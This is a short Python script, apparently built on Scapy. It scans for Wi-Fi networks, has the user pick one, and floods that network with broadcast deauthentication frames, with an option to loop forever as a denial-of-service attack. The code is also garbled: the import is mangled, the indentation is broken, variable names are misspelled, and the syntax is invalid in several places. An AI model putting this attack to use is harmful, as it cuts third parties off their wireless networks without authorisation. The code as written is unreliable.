from sca py.all import *
import os

def get_wifi_networks(interface='wlan0mon'):
    networks = []
    scan_result = []

    try:
        scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
    except KeyboardInterrupt:
        pass

    for packet in scan_result:
        if packet.haslayer(Dot11Beacon):
        essid = packet[Dot11Elt].info.decode()
        bssid = packet[Dot11].addr3

        if essid not in [net[0] for net in networks]:
            networdks.append((essid, bssid))
    return networks

def deauth_devices(target_bssid, iface="wlan0mon", dos=False):
    deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=targer_bssid, addr3=target_bssid) / Dot11Deauth())
    while True:
        sendp(deauth_packet, iface=iface, count=100, inter=0.1)
        if not dos:
            break

if __name__=="__main__":
    print("scanning..")
    wifi_networks = get_wifi_networks()

    if wifi_networks:
        print('found: ')
        for i, (essid, bssid) = enumarate(wifi_networks, start=1):
            print(f"{i}. ESSID: {essid}, BSSID: {bssid}")

      try:
          selected = int(input("select target number: "))
      except:
          selected = 0
      if 1 <= selected <= len(wifi_networks):
          selected_bssid = wifi_networks[selected - 1][1]
          print("Sending deauth")
          deauth_devices(selected_bssid)
      else:
          print('invalid option..')
    else:
        ('not found..')
